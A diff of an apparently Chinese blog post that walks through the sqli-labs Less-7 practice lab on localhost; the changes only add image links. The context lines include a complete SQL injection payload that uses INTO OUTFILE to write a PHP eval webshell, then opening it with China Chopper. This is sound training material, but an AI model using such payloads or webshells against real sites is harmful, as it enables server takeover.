@@ -88,16 +88,16 @@
       
         <h1>Less-7</h1>
 进入http://127.0.0.1/sql/Less-7，输入/?id=1',显示下面的图：
-![2]()
-![1]()
+![2](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/02/sql-labs-Less-7/2.png)
+![1](https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/02/sql-labs-Less-7/1.png)
 说明有sql注入漏洞，但是不知道要用什么注入，看源代码知道要用`'))`(?)注入
 "use outfile"表示要用out file函数。
 用order by查出数据有三列，然后用union操作符和outfile注入一句话木马。
 http://127.0.0.1/sql/Less-7/?id=-1'))  union select 1,2,"<?php @eval($_POST['pass']);?>" into outfile 'E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.php'--+
 E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7目录下生成text.php
-![3]()
+![3](https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/3.png)
 然后用中国菜刀打开http://127.0.0.1/sql/Less-7/text.php
-![4]()
+![4](https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/4.png)
 这样就拿到了这个网站的webshell。
 
 <h1>小结</h1>
